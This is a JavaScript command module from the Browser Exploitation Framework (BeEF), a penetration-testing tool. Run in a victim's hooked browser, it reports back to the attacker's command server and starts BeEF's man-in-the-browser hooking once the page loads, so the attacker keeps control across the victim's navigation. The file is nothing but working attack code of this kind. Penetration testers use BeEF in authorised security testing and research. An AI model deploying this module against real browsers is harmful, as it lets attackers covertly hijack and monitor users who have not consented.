/*
 * Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

beef.execute(function() {
	try{
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "Browser hooked.");
		beef.mitb.init("<%= @command_url %>", <%= @command_id %>);
		var MITBload = setInterval(function(){
				if(beef.pageIsLoaded){
					clearInterval(MITBload);
					beef.mitb.hook();
				}
			}, 100);
	}catch(e){
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "Failed to hook browser: " + e.message);
	}
});